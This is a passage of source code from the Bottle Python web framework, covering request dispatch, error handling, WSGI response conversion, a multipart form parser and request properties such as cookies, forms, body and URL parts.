``PATCH`` method parameter. \"\"\"\n        return self.route(path, method, **options)\n\n    def error(self, code=500, callback=None):\n        \"\"\" Register an output handler for a HTTP error code. Can\n            be used as a decorator or called directly ::\n\n                def error_handler_500(error):\n                    return 'error_handler_500'\n\n                app.error(code=500, callback=error_handler_500)\n\n                @app.error(404)\n                def error_handler_404(error):\n                    return 'error_handler_404'\n\n        \"\"\"\n\n        def decorator(callback):\n            if isinstance(callback, basestring): callback = load(callback)\n            self.error_handler[int(code)] = callback\n            return callback\n\n        return decorator(callback) if callback else decorator\n\n    def default_error_handler(self, res):\n        return tob(template(ERROR_PAGE_TEMPLATE, e=res, template_settings=dict(name='__ERROR_PAGE_TEMPLATE')))\n\n    def _handle(self, environ):\n        path = environ['bottle.raw_path'] = environ['PATH_INFO']\n        if py3k:\n            environ['PATH_INFO'] = path.encode('latin1').decode('utf8', 'ignore')\n\n        environ['bottle.app'] = self\n        request.bind(environ)\n        response.bind()\n\n        try:\n            while True: # Remove in 0.14 together with RouteReset\n                out = None\n                try:\n                    self.trigger_hook('before_request')\n                    route, args = self.router.match(environ)\n                    environ['route.handle'] = route\n                    environ['bottle.route'] = route\n                    environ['route.url_args'] = args\n                    out = route.call(**args)\n                    break\n                except HTTPResponse as E:\n                    out = E\n                    break\n                except RouteReset:\n                    depr(0, 13, \"RouteReset exception deprecated\",\n                                \"Call route.call() after route.reset() and \"\n                                \"return the result.\")\n                    route.reset()\n                    continue\n                finally:\n                    if isinstance(out, HTTPResponse):\n                        out.apply(response)\n                    try:\n                        self.trigger_hook('after_request')\n                    except HTTPResponse as E:\n                        out = E\n                        out.apply(response)\n        except (KeyboardInterrupt, SystemExit, MemoryError):\n            raise\n        except Exception as E:\n            if not self.catchall: raise\n            stacktrace = format_exc()\n            environ['wsgi.errors'].write(stacktrace)\n            environ['wsgi.errors'].flush()\n            environ['bottle.exc_info'] = sys.exc_info()\n            out = HTTPError(500, \"Internal Server Error\", E, stacktrace)\n            out.apply(response)\n\n        return out\n\n    def _cast(self, out, peek=None):\n        \"\"\" Try to convert the parameter into something WSGI compatible and set\n        correct HTTP headers when possible.\n        Support: False, str, unicode, dict, HTTPResponse, HTTPError, file-like,\n        iterable of strings and iterable of unicodes\n        \"\"\"\n\n        # Empty output is done here\n        if not out:\n            if 'Content-Length' not in response:\n                response['Content-Length'] = 0\n            return []\n        # Join lists of byte or unicode strings. Mixed lists are NOT supported\n        if isinstance(out, (tuple, list))\\\n        and isinstance(out[0], (bytes, unicode)):\n            out = out[0][0:0].join(out)  # b'abc'[0:0] -> b''\n        # Encode unicode strings\n        if isinstance(out, unicode):\n            out = out.encode(response.charset)\n        # Byte Strings are just returned\n        if isinstance(out, bytes):\n            if 'Content-Length' not in response:\n                response['Content-Length'] = len(out)\n            return [out]\n        # HTTPError or HTTPException (recursive, because they may wrap anything)\n        # TODO: Handle these explicitly in handle() or make them iterable.\n        if isinstance(out, HTTPError):\n            out.apply(response)\n            out = self.error_handler.get(out.status_code,\n                                         self.default_error_handler)(out)\n            return self._cast(out)\n        if isinstance(out, HTTPResponse):\n            out.apply(response)\n            return self._cast(out.body)\n\n        # File-like objects.\n        if hasattr(out, 'read'):\n            if 'wsgi.file_wrapper' in request.environ:\n                return request.environ['wsgi.file_wrapper'](out)\n            elif hasattr(out, 'close') or not hasattr(out, '__iter__'):\n                return WSGIFileWrapper(out)\n\n        # Handle Iterables. We peek into them to detect their inner type.\n        try:\n            iout = iter(out)\n            first = next(iout)\n            while not first:\n                first = next(iout)\n        except StopIteration:\n            return self._cast('')\n        except HTTPResponse as E:\n            first = E\n        except (KeyboardInterrupt, SystemExit, MemoryError):\n            raise\n        except Exception as error:\n            if not self.catchall: raise\n            first = HTTPError(500, 'Unhandled exception', error, format_exc())\n\n        # These are the inner types allowed in iterator or generator objects.\n        if isinstance(first, HTTPResponse):\n            return self._cast(first)\n        elif isinstance(first, bytes):\n            new_iter = itertools.chain([first], iout)\n        elif isinstance(first, unicode):\n            encoder = lambda x: x.encode(response.charset)\n            new_iter = imap(encoder, itertools.chain([first], iout))\n        else:\n            msg = 'Unsupported response type: %s' % type(first)\n            return self._cast(HTTPError(500, msg))\n        if hasattr(out, 'close'):\n            new_iter = _closeiter(new_iter, out.close)\n        return new_iter\n\n    def wsgi(self, environ, start_response):\n        \"\"\" The bottle WSGI-interface. \"\"\"\n        try:\n            out = self._cast(self._handle(environ))\n            # rfc2616 section 4.3\n            if response._status_code in (100, 101, 204, 304)\\\n            or environ['REQUEST_METHOD'] == 'HEAD':\n                if hasattr(out, 'close'): out.close()\n                out = []\n            exc_info = environ.get('bottle.exc_info')\n            if exc_info is not None:\n                del environ['bottle.exc_info']\n            start_response(response._wsgi_status_line(), response.headerlist, exc_info)\n            return out\n        except (KeyboardInterrupt, SystemExit, MemoryError):\n            raise\n        except Exception as E:\n            if not self.catchall: raise\n            err = '<h1>Critical error while processing request: %s</h1>' \\\n                  % html_escape(environ.get('PATH_INFO', '/'))\n            if DEBUG:\n                err += '<h2>Error:</h2>\\n<pre>\\n%s\\n</pre>\\n' \\\n                       '<h2>Traceback:</h2>\\n<pre>\\n%s\\n</pre>\\n' \\\n                       % (html_escape(repr(E)), html_escape(format_exc()))\n            environ['wsgi.errors'].write(err)\n            environ['wsgi.errors'].flush()\n            headers = [('Content-Type', 'text/html; charset=UTF-8')]\n            start_response('500 INTERNAL SERVER ERROR', headers, sys.exc_info())\n            return [tob(err)]\n\n    def __call__(self, environ, start_response):\n        \"\"\" Each instance of :class:'Bottle' is a WSGI application. \"\"\"\n        return self.wsgi(environ, start_response)\n\n    def __enter__(self):\n        \"\"\" Use this application as default for all module-level shortcuts. \"\"\"\n        default_app.push(self)\n        return self\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        default_app.pop()\n\n    def __setattr__(self, name, value):\n        if name in self.__dict__:\n            raise AttributeError(\"Attribute %s already defined. Plugin conflict?\" % name)\n        self.__dict__[name] = value\n\n\n###############################################################################\n# HTTP and WSGI Tools ##########################################################\n###############################################################################\n\n# Multipart parsing stuff\n\nclass StopMarkupException(BottleException):\n    pass\n\n\nHYPHEN = tob('-')\nCR = tob('\\r')\nLF = tob('\\n')\nCRLF = CR + LF\nLFCRLF = LF + CR + LF\nHYPHENx2 = HYPHEN * 2\nCRLFx2 = CRLF * 2\nCRLF_LEN = len(CRLF)\nCRLFx2_LEN = len(CRLFx2)\n\nMULTIPART_BOUNDARY_PATT = re.compile(r'^multipart/.+?boundary=(.+?)(;|$)')\n\nclass MPHeadersEaeter:\n    end_headers_patt = re.compile(tob(r'(\\r\\n\\r\\n)|(\\r(\\n\\r?)?)$'))\n\n    def __init__(self):\n        self.headers_end_expected = None\n        self.eat_meth = self._eat_first_crlf_or_last_hyphens\n        self._meth_map = {\n            CR: self._eat_lf,\n            HYPHEN: self._eat_last_hyphen\n        }\n        self.stopped = False\n\n    def eat(self, chunk, base):\n        pos = self.eat_meth(chunk, base)\n        if pos is None: return\n        if self.eat_meth != self._eat_headers:\n            if self.stopped:\n                raise StopMarkupException()\n            base = pos\n            self.eat_meth = self._eat_headers\n            return self.eat(chunk, base)\n        # found headers section end, reset eater\n        self.eat_meth = self._eat_first_crlf_or_last_hyphens\n        return pos\n\n    def _eat_last_hyphen(self, chunk, base):\n        chunk_start = chunk[base: base + 2]\n        if not chunk_start: return\n        if chunk_start == HYPHEN:\n            self.stopped = True\n            return base + 1\n        raise HTTPError(422, 'Last hyphen was expected, got (first 2 symbols slice): %s' % chunk_start)\n\n    def _eat_lf(self, chunk, base):\n        chunk_start = chunk[base: base + 1]\n        if not chunk_start: return\n        if chunk_start == LF: return base + 1\n        invalid_sequence = CR + chunk_start\n        raise HTTPError(422, 'Malformed headers, found invalid sequence: %s' % invalid_sequence)\n\n    def _eat_first_crlf_or_last_hyphens(self, chunk, base):\n        chunk_start = chunk[base: base + 2]\n        if not chunk_start: return\n        if chunk_start == CRLF: return base + 2\n        if len(chunk_start) == 1:\n            self.eat_meth = self._meth_map.get(chunk_start)\n        elif chunk_start == HYPHENx2:\n            self.stopped = True\n            return base + 2\n        if self.eat_meth is None:\n            raise HTTPError(422, 'Malformed headers, invalid section start: %s' % chunk_start)\n\n    def _eat_headers(self, chunk, base):\n        expected = self.headers_end_expected\n        if expected is not None:\n            expected_len = len(expected)\n            chunk_start = chunk[base:expected_len]\n            if chunk_start == expected:\n                self.headers_end_expected = None\n                return base + expected_len - CRLFx2_LEN\n            chunk_start_len = len(chunk_start)\n            if not chunk_start_len: return\n            if chunk_start_len < expected_len:\n                if expected.startswith(chunk_start):\n                    self.headers_end_expected = expected[chunk_start_len:]\n                    return\n                self.headers_end_expected = None\n            if expected == LF:  # we saw CRLFCR\n                invalid_sequence = CR + chunk_start[0:1]\n                # NOTE we don not catch all CRLF-malformed errors, but only obvious ones\n                # to stop doing useless work\n                raise HTTPError(422, 'Malformed headers, found invalid sequence: %s' % invalid_sequence)\n            else:\n                assert expected_len >= 2  # (CR)LFCRLF or (CRLF)CRLF\n                self.headers_end_expected = None\n        assert self.headers_end_expected is None\n        s = self.end_headers_patt.search(chunk, base)\n        if s is None: return\n        end_found = s.start(1)\n        if end_found >= 0: return end_found\n        end_head = s.group(2)\n        if end_head is not None:\n            self.headers_end_expected = CRLFx2[len(end_head):]\n\n\nclass MPBodyMarkup:\n    def __init__(self, boundary):\n        self.markups = []\n        self.error = None\n        if CR in boundary:\n            raise HTTPError(422, 'The `CR` must not be in the boundary: %s' % boundary)\n        boundary = HYPHENx2 + boundary\n        self.boundary = boundary\n        token = CRLF + boundary\n        self.tlen = len(token)\n        self.token = token\n        self.trest = self.trest_len = None\n        self.abspos = 0\n        self.abs_start_section = 0\n        self.headers_eater = MPHeadersEaeter()\n        self.cur_meth = self._eat_start_boundary\n        self._eat_headers = self.headers_eater.eat\n        self.stopped = False\n        self.idx = idx = defaultdict(list)   # 1-based indices for each token symbol\n        for i, c in enumerate(token, start=1):\n            idx[c].append([i, token[:i]])\n\n    def _match_tail(self, s, start, end):\n        idxs = self.idx.get(s[end - 1])\n        if idxs is None: return\n        slen = end - start\n        assert slen <= self.tlen\n        for i, thead in idxs:  # idxs is 1-based index\n            search_pos = slen - i\n            if search_pos < 0: return\n            if s[start + search_pos:end] == thead: return i  # if s_tail == token_head\n\n    def _iter_markup(self, chunk):\n        if self.stopped:\n            raise StopMarkupException()\n        cur_meth = self.cur_meth\n        abs_start_section = self.abs_start_section\n        start_next_sec = 0\n        skip_start = 0\n        tlen = self.tlen\n        eat_data, eat_headers = self._eat_data, self._eat_headers\n        while True:\n            try:\n                end_section = cur_meth(chunk, start_next_sec)\n            except StopMarkupException:\n                self.stopped = True\n                return\n            if end_section is None: break\n            if cur_meth == eat_headers:\n                sec_name = 'headers'\n                start_next_sec = end_section + CRLFx2_LEN\n                cur_meth = eat_data\n                skip_start = 0\n            elif cur_meth == eat_data:\n                sec_name = 'data'\n                start_next_sec = end_section + tlen\n                skip_start = CRLF_LEN\n                cur_meth = eat_headers\n            else:\n                assert cur_meth == self._eat_start_boundary\n                sec_name = 'data'\n                start_next_sec = end_section + tlen\n                skip_start = CRLF_LEN\n                cur_meth = eat_headers\n\n                # if the body starts with a hyphen,\n                # we will have a negative abs_end_section equal to the length of the CRLF\n                abs_end_section = self.abspos + end_section\n                if abs_end_section < 0:\n                    assert abs_end_section == -CRLF_LEN\n                    end_section = -self.abspos\n            yield sec_name, (abs_start_section, self.abspos + end_section)\n            abs_start_section = self.abspos + start_next_sec + skip_start\n        self.abspos += len(chunk)\n        self.cur_meth = cur_meth\n        self.abs_start_section = abs_start_section\n\n    def _eat_start_boundary(self, chunk, base):\n        if self.trest is None:\n            chunk_start = chunk[base: base + 1]\n            if not chunk_start: return\n            if chunk_start == CR: return self._eat_data(chunk, base)\n            boundary = self.boundary\n            if chunk.startswith(boundary): return base - CRLF_LEN\n            if chunk_start != boundary[:1]:\n                raise HTTPError(\n                    422, 'Invalid multipart/formdata body start, expected hyphen or CR, got: %s' % chunk_start)\n            self.trest = boundary\n            self.trest_len = len(boundary)\n        end_section = self._eat_data(chunk, base)\n        if end_section is not None: return end_section\n\n    def _eat_data(self, chunk, base):\n        chunk_len = len(chunk)\n        token, tlen, trest, trest_len = self.token, self.tlen, self.trest, self.trest_len\n        start = base\n        match_tail = self._match_tail\n        part = None\n        while True:\n            end = start + tlen\n            if end > chunk_len:\n                part = chunk[start:]\n                break\n            if trest is not None:\n                if chunk[start:start + trest_len] == trest:\n                    data_end = start + trest_len - tlen\n                    self.trest_len = self.trest = None\n                    return data_end\n                else:\n                    trest_len = trest = None\n            matched_len = match_tail(chunk, start, end)\n            if matched_len is not None:\n                if matched_len == tlen:\n                    self.trest_len = self.trest = None\n                    return start\n                else:\n                    trest_len, trest = tlen - matched_len, token[matched_len:]\n            start += tlen\n        # process the tail of the chunk\n        if part:\n            part_len = len(part)\n            if trest is not None:\n                if part_len < trest_len:\n                    if trest.startswith(part):\n                        trest_len -= part_len\n                        trest = trest[part_len:]\n                        part = None\n                    else:\n                        trest_len = trest = None\n                else:\n                    if part.startswith(trest):\n                        data_end = start + trest_len - tlen\n                        self.trest_len = self.trest = None\n                        return data_end\n                    trest_len = trest = None\n\n            if part is not None:\n                assert trest is None\n                matched_len = match_tail(part, 0, part_len)\n                if matched_len is not None:\n                    trest_len, trest = tlen - matched_len, token[matched_len:]\n        self.trest_len, self.trest = trest_len, trest\n\n    def _parse(self, chunk):\n        for name, start_end in self._iter_markup(chunk):\n            self.markups.append([name, start_end])\n\n    def parse(self, chunk):\n        if self.error is not None: return\n        try:\n            self._parse(chunk)\n        except Exception as exc:\n            self.error = exc\n\n\nclass MPBytesIOProxy:\n    def __init__(self, src, start, end):\n        self._src = src\n        self._st = start\n        self._end = end\n        self._pos = start\n\n    def tell(self):\n        return self._pos - self._st\n\n    def seek(self, pos):\n        if pos < 0: pos = 0\n        self._pos = min(self._st + pos, self._end)\n\n    def read(self, sz=None):\n        max_sz = self._end - self._pos\n        if max_sz <= 0:\n            return tob('')\n        if sz is not None and sz > 0:\n            sz = min(sz, max_sz)\n        else:\n            sz = max_sz\n        self._src.seek(self._pos)\n        self._pos += sz\n        return self._src.read(sz)\n\n    def writable(self):\n        return False\n\n    def fileno(self):\n        raise OSError('Not supported')\n\n    def closed(self):\n        return self._src.closed()\n\n    def close(self):\n        pass\n\n\nclass MPHeader:\n    def __init__(self, name, value, options):\n        self.name = name\n        self.value = value\n        self.options = options\n\n\nclass MPFieldStorage:\n\n    _patt = re.compile(tonat('(.+?)(=(.+?))?(;|$)'))\n\n    def __init__(self):\n        self.name = None\n        self.value = None\n        self.filename = None\n        self.file = None\n        self.ctype = None\n        self.headers = {}\n\n    def read(self, src, headers_section, data_section, max_read):\n        start, end = headers_section\n        sz = end - start\n        has_read = sz\n        if has_read > max_read:\n            raise HTTPError(413, 'Request entity too large')\n        src.seek(start)\n        headers_raw = tonat(src.read(sz))\n        for header_raw in headers_raw.splitlines():\n            header = self.parse_header(header_raw)\n            self.headers[header.name] = header\n            if header.name == 'Content-Disposition':\n                self.name = header.options['name']\n                self.filename = header.options.get('filename')\n            elif header.name == 'Content-Type':\n                self.ctype = header.value\n        if self.name is None:\n            raise HTTPError(422, 'Noname field found while parsing multipart/formdata body: %s' % header_raw)\n        if self.filename is not None:\n            self.file = MPBytesIOProxy(src, *data_section)\n        else:\n            start, end = data_section\n            sz = end - start\n            if sz:\n                has_read += sz\n                if has_read > max_read:\n                    raise HTTPError(413, 'Request entity too large')\n                src.seek(start)\n                self.value = tonat(src.read(sz))\n            else:\n                self.value = ''\n        return has_read\n\n    @classmethod\n    def parse_header(cls, s):\n        htype, rest = s.split(':', 1)\n        opt_iter = cls._patt.finditer(rest)\n        hvalue = next(opt_iter).group(1).strip()\n        dct = {}\n        for it in opt_iter:\n            k = it.group(1).strip()\n            v = it.group(3)\n            if v is not None:\n                v = v.strip('\"')\n            dct[k.lower()] = v\n        return MPHeader(name=htype, value=hvalue, options=dct)\n\n    @classmethod\n    def iter_items(cls, src, markup, max_read):\n        iter_markup = iter(markup)\n        # check & skip empty data (body should start from empty data)\n        null_data = next(iter_markup, None)\n        if null_data is None: return\n        sec_name, [start, end] = null_data\n        assert sec_name == 'data'\n        if end > 0:\n            raise HTTPError(\n                422, 'Malformed multipart/formdata, unexpected data before the first boundary at: [%d:%d]'\n                % (start, end))\n        headers = next(iter_markup, None)\n        data = next(iter_markup, None)\n        while headers:\n            sec_name, headers_slice = headers\n            assert sec_name == 'headers'\n            if not data:\n                raise HTTPError(\n                    422, 'Malformed multipart/formdata, no data found for the field at: [%d:%d]'\n                    % tuple(headers_slice))\n            sec_name, data_slice = data\n            assert sec_name == 'data'\n            field = cls()\n            has_read = field.read(src, headers_slice, data_slice, max_read=max_read)\n            max_read -= has_read\n            yield field\n            headers = next(iter_markup, None)\n            data = next(iter_markup, None)\n\n\nclass BaseRequest(object):\n    \"\"\" A wrapper for WSGI environment dictionaries that adds a lot of\n        convenient access methods and properties. Most of them are read-only.\n\n        Adding new attributes to a request actually adds them to the environ\n        dictionary (as 'bottle.request.ext.<name>'). This is the recommended\n        way to store and access request-specific data.\n    \"\"\"\n\n    __slots__ = ('environ', )\n\n    #: Maximum size of memory buffer for :attr:`body` in bytes.\n    MEMFILE_MAX = 102400\n\n    def __init__(self, environ=None):\n        \"\"\" Wrap a WSGI environ dictionary. \"\"\"\n        #: The wrapped WSGI environ dictionary. This is the only real attribute.\n        #: All other attributes actually are read-only properties.\n        self.environ = {} if environ is None else environ\n        self.environ['bottle.request'] = self\n\n    @DictProperty('environ', 'bottle.app', read_only=True)\n    def app(self):\n        \"\"\" Bottle application handling this request. \"\"\"\n        raise RuntimeError('This request is not connected to an application.')\n\n    @DictProperty('environ', 'bottle.route', read_only=True)\n    def route(self):\n        \"\"\" The bottle :class:`Route` object that matches this request. \"\"\"\n        raise RuntimeError('This request is not connected to a route.')\n\n    @DictProperty('environ', 'route.url_args', read_only=True)\n    def url_args(self):\n        \"\"\" The arguments extracted from the URL. \"\"\"\n        raise RuntimeError('This request is not connected to a route.')\n\n    @property\n    def path(self):\n        \"\"\" The value of ``PATH_INFO`` with exactly one prefixed slash (to fix\n            broken clients and avoid the \"empty path\" edge case). \"\"\"\n        return '/' + self.environ.get('PATH_INFO', '').lstrip('/')\n\n    @property\n    def method(self):\n        \"\"\" The ``REQUEST_METHOD`` value as an uppercase string. \"\"\"\n        return self.environ.get('REQUEST_METHOD', 'GET').upper()\n\n    @DictProperty('environ', 'bottle.request.headers', read_only=True)\n    def headers(self):\n        \"\"\" A :class:`WSGIHeaderDict` that provides case-insensitive access to\n            HTTP request headers. \"\"\"\n        return WSGIHeaderDict(self.environ)\n\n    def get_header(self, name, default=None):\n        \"\"\" Return the value of a request header, or a given default value. \"\"\"\n        return self.headers.get(name, default)\n\n    @DictProperty('environ', 'bottle.request.cookies', read_only=True)\n    def cookies(self):\n        \"\"\" Cookies parsed into a :class:`FormsDict`. Signed cookies are NOT\n            decoded. Use :meth:`get_cookie` if you expect signed cookies. \"\"\"\n        cookies = SimpleCookie(self.environ.get('HTTP_COOKIE', '')).values()\n        return FormsDict((c.key, c.value) for c in cookies)\n\n    def get_cookie(self, key, default=None, secret=None, digestmod=hashlib.sha256):\n        \"\"\" Return the content of a cookie. To read a `Signed Cookie`, the\n            `secret` must match the one used to create the cookie (see\n            :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing\n            cookie or wrong signature), return a default value. \"\"\"\n        value = self.cookies.get(key)\n        if secret:\n            # See BaseResponse.set_cookie for details on signed cookies.\n            if value and value.startswith('!') and '?' in value:\n                sig, msg = map(tob, value[1:].split('?', 1))\n                hash = hmac.new(tob(secret), msg, digestmod=digestmod).digest()\n                if _lscmp(sig, base64.b64encode(hash)):\n                    dst = pickle.loads(base64.b64decode(msg))\n                    if dst and dst[0] == key:\n                        return dst[1]\n            return default\n        return value or default\n\n    @DictProperty('environ', 'bottle.request.query', read_only=True)\n    def query(self):\n        \"\"\" The :attr:`query_string` parsed into a :class:`FormsDict`. These\n            values are sometimes called \"URL arguments\" or \"GET parameters\", but\n            not to be confused with \"URL wildcards\" as they are provided by the\n            :class:`Router`. \"\"\"\n        get = self.environ['bottle.get'] = FormsDict()\n        pairs = _parse_qsl(self.environ.get('QUERY_STRING', ''))\n        for key, value in pairs:\n            get[key] = value\n        return get\n\n    @DictProperty('environ', 'bottle.request.forms', read_only=True)\n    def forms(self):\n        \"\"\" Form values parsed from an `url-encoded` or `multipart/form-data`\n            encoded POST or PUT request body. The result is returned as a\n            :class:`FormsDict`. All keys and values are strings. File uploads\n            are stored separately in :attr:`files`. \"\"\"\n        forms = FormsDict()\n        forms.recode_unicode = self.POST.recode_unicode\n        for name, item in self.POST.allitems():\n            if not isinstance(item, FileUpload):\n                forms[name] = item\n        return forms\n\n    @DictProperty('environ', 'bottle.request.params', read_only=True)\n    def params(self):\n        \"\"\" A :class:`FormsDict` with the combined values of :attr:`query` and\n            :attr:`forms`. File uploads are stored in :attr:`files`. \"\"\"\n        params = FormsDict()\n        for key, value in self.query.allitems():\n            params[key] = value\n        for key, value in self.forms.allitems():\n            params[key] = value\n        return params\n\n    @DictProperty('environ', 'bottle.request.files', read_only=True)\n    def files(self):\n        \"\"\" File uploads parsed from `multipart/form-data` encoded POST or PUT\n            request body. The values are instances of :class:`FileUpload`.\n\n        \"\"\"\n        files = FormsDict()\n        files.recode_unicode = self.POST.recode_unicode\n        for name, item in self.POST.allitems():\n            if isinstance(item, FileUpload):\n                files[name] = item\n        return files\n\n    @DictProperty('environ', 'bottle.request.json', read_only=True)\n    def json(self):\n        \"\"\" If the ``Content-Type`` header is ``application/json`` or\n            ``application/json-rpc``, this property holds the parsed content\n            of the request body. Only requests smaller than :attr:`MEMFILE_MAX`\n            are processed to avoid memory exhaustion.\n            Invalid JSON raises a 400 error response.\n        \"\"\"\n        ctype = self.environ.get('CONTENT_TYPE', '').lower().split(';')[0]\n        if ctype in ('application/json', 'application/json-rpc'):\n            b = self._get_body_string(self.MEMFILE_MAX)\n            if not b:\n                return None\n            try:\n                return json_loads(b)\n            except (ValueError, TypeError):\n                raise HTTPError(400, 'Invalid JSON')\n        return None\n\n    def _iter_body(self, read, bufsize):\n        maxread = max(0, self.content_length)\n        while maxread:\n            part = read(min(maxread, bufsize))\n            if not part: break\n            yield part\n            maxread -= len(part)\n\n    @staticmethod\n    def _iter_chunked(read, bufsize):\n        err = HTTPError(400, 'Error while parsing chunked transfer body.')\n        rn, sem, bs = tob('\\r\\n'), tob(';'), tob('')\n        while True:\n            header = read(1)\n            while header[-2:] != rn:\n                c = read(1)\n                header += c\n                if not c: raise err\n                if len(header) > bufsize: raise err\n            size, _, _ = header.partition(sem)\n            try:\n                maxread = int(tonat(size.strip()), 16)\n            except ValueError:\n                raise err\n            if maxread == 0: break\n            buff = bs\n            while maxread > 0:\n                if not buff:\n                    buff = read(min(maxread, bufsize))\n                part, buff = buff[:maxread], buff[maxread:]\n                if not part: raise err\n                yield part\n                maxread -= len(part)\n            if read(2) != rn:\n                raise err\n\n    @DictProperty('environ', 'bottle.request.body', read_only=True)\n    def _body(self):\n        mp_markup = None\n        mp_boundary_match = MULTIPART_BOUNDARY_PATT.match(self.environ.get('CONTENT_TYPE', ''))\n        if mp_boundary_match is not None:\n            mp_markup = MPBodyMarkup(tob(mp_boundary_match.group(1)))\n        try:\n            read_func = self.environ['wsgi.input'].read\n        except KeyError:\n            self.environ['wsgi.input'] = BytesIO()\n            return self.environ['wsgi.input']\n        body_iter = self._iter_chunked if self.chunked else self._iter_body\n        body, body_size, is_temp_file = BytesIO(), 0, False\n        for part in body_iter(read_func, self.MEMFILE_MAX):\n            body.write(part)\n            if mp_markup is not None:\n                mp_markup.parse(part)\n            body_size += len(part)\n            if not is_temp_file and body_size > self.MEMFILE_MAX:\n                body, tmp = NamedTemporaryFile(mode='w+b'), body\n                body.write(tmp.getvalue())\n                del tmp\n                is_temp_file = True\n        body.multipart_markup = mp_markup\n        self.environ['wsgi.input'] = body\n        body.seek(0)\n        return body\n\n    def _get_body_string(self, maxread):\n        \"\"\" Read body into a string. Raise HTTPError(413) on requests that are\n            too large. \"\"\"\n        if self.content_length > maxread:\n            raise HTTPError(413, 'Request entity too large')\n        data = self.body.read(maxread + 1)\n        if len(data) > maxread:\n            raise HTTPError(413, 'Request entity too large')\n        return data\n\n    @property\n    def body(self):\n        \"\"\" The HTTP request body as a seek-able file-like object. Depending on\n            :attr:`MEMFILE_MAX`, this is either a temporary file or a\n            :class:`io.BytesIO` instance. Accessing this property for the first\n            time reads and replaces the ``wsgi.input`` environ variable.\n            Subsequent accesses just do a `seek(0)` on the file object. \"\"\"\n        self._body.seek(0)\n        return self._body\n\n    @property\n    def chunked(self):\n        \"\"\" True if Chunked transfer encoding was. \"\"\"\n        return 'chunked' in self.environ.get(\n            'HTTP_TRANSFER_ENCODING', '').lower()\n\n    #: An alias for :attr:`query`.\n    GET = query\n\n    @DictProperty('environ', 'bottle.request.post', read_only=True)\n    def POST(self):\n        \"\"\" The values of :attr:`forms` and :attr:`files` combined into a single\n            :class:`FormsDict`. Values are either strings (form values) or\n            instances of :class:`MPBytesIOProxy` (file uploads).\n        \"\"\"\n        post = FormsDict()\n        # We default to application/x-www-form-urlencoded for everything that\n        # is not multipart and take the fast path (also: 3.1 workaround)\n        if not self.content_type.startswith('multipart/'):\n            body = tonat(self._get_body_string(self.MEMFILE_MAX), 'latin1')\n            for key, value in _parse_qsl(body):\n                post[key] = value\n            return post\n\n        if py3k:\n            post.recode_unicode = False\n        body = self.body\n        markup = body.multipart_markup\n        if markup is None:\n            raise HTTPError(400, '`boundary` required for mutlipart content')\n        elif markup.error is not None:\n            raise markup.error\n        for item in MPFieldStorage.iter_items(body, markup.markups, self.MEMFILE_MAX):\n            if item.filename is None:\n                post[item.name] = item.value\n            else:\n                post[item.name] = FileUpload(item.file, item.name,\n                                             item.filename, item.headers)\n        return post\n\n    @property\n    def url(self):\n        \"\"\" The full request URI including hostname and scheme. If your app\n            lives behind a reverse proxy or load balancer and you get confusing\n            results, make sure that the ``X-Forwarded-Host`` header is set\n            correctly. \"\"\"\n        return self.urlparts.geturl()\n\n    @DictProperty('environ', 'bottle.request.urlparts', read_only=True)\n    def urlparts(self):\n        \"\"\" The :attr:`url` string as an :class:`urlparse.SplitResult` tuple.\n            The tuple contains (scheme, host, path, query_string and fragment),\n            but the fragment is always empty because it is not visible to the\n            server. \"\"\"\n        env = self.environ\n        http = env.get('HTTP_X_FORWARDED_PROTO') \\\n             or env.get('wsgi.url_scheme', 'http')\n        host = env.get('HTTP_X_FORWARDED_HOST') or env.get('HTTP_HOST')\n        if not host:\n            # HTTP 1.1 requires a Host-header. This is for HTTP/1.0 clients.\n            host = env.get('SERVER_NAME', '127.0.0.1')\n            port = env.get('SERVER_PORT')\n            if port and port != ('80' if http == 'http' else '443'):\n                host += ':' + port\n        path = urlquote(self.fullpath)\n        return UrlSplitResult(http, host, path, env.get('QUERY_STRING'), '')\n\n    @property\n    def fullpath(self):\n        \"\"\" Request path including :attr:`script_name` (if present). \"\"\"\n        return urljoin(self.script_name, self.path.lstrip('/'))\n\n    @property\n    def query_string(self):\n        \"\"\" The raw :attr:`query` part of the URL (everything in between ``?``\n            and ``#``) as a string. \"\"\"\n        return self.environ.get('QUERY_STRING', '')\n\n    @property\n    def script_name(self):\n        \"\"\" The initial portion of the URL's `path` that was removed by a higher\n            level (server or routing middleware) before the application was\n            called. This script path is returned with leading and tailing\n            slashes. \"\"\"\n        script_name = self.environ.get('SCRIPT_NAME', '').strip('/')\n        return '/' + script_name + '/' if script_name else '/'\n\n    def path_shift(self, shift=1):\n        \"\"\" Shift path segments from :attr:`path` to :attr:`script_name` and\n            vice versa.\n\n           :param shift: The number of path segments to shift. May be negative\n                         to change the shift direction. (default: 1)\n        \"\"\"\n        script, path = path_shift(self.environ.get('SCRIPT_NAME', '/'), self.path, shift)\n        self['SCRIPT_NAME'], self['PATH_INFO'] = script, path\n\n    @property\n    def content_length(self):\n        \"\"\" The request body length as an integer. The client is responsible to\n            set this header. Otherwise, the real length of the body is unknown\n            and -1 is returned. In this case, :attr:`body` will be empty. \"\"\"\n        return int(self.environ.get('CONTENT_LENGTH') or -1)\n\n    @property\n    def content_type(self):\n        \"\"\" The Content-Type header as a lowercase-string (default: empty). \"\"\"\n        return self.environ.get('CONTENT_TYPE', '').lower()\n\n    @property\n    def is_xhr(self):\n        \"\"\" True if the request was triggered by a XMLHttpRequest. This only\n            works with JavaScript libraries that support the `X-Requested-With`\n            header (most of the popular libraries do). \"\"\"\n        requested_with = self.environ.get('HTTP_X_REQUESTED_WITH', '')\n        return requested_with.lower() == 'xmlhttprequest'\n\n    @property\n    def is_ajax(self):\n        \"\"\" Alias for :attr:`is_xhr`. \"Ajax\" is not the right term. \"\"\"\n        return self.is_xhr\n\n    @property\n    def auth(self):\n        \"\"\" HTTP authentication data as a (user, password) tuple. This\n            implementation currently supports basic (not digest) authentication\n            only. If the authentication happened at a higher level (e.g. in the\n            front web-server or a middleware), the password field is None, but\n            the user field is looked up from the ``REMOTE_USER`` environ\n            variable. On any errors, None is returned. \"\"\"\n        basic = parse_auth(self.environ.get('HTTP_AUTHORIZATION', ''))\n        if basic: return basic\n        ruser = self.environ.get('REMOTE_USER')\n        if ruser: return (ruser, None)\n        return None\n\n    @property\n    def remote_route(self):\n        \"\"\" A list of all IPs that were involved in this request, starting with\n            the client IP and followed by zero or more proxies. This does only\n            work if all proxies support the ```X-Forwarded-For`` header. Note\n            that this information can be forged by malicious clients. \"\"\"\n        proxy = 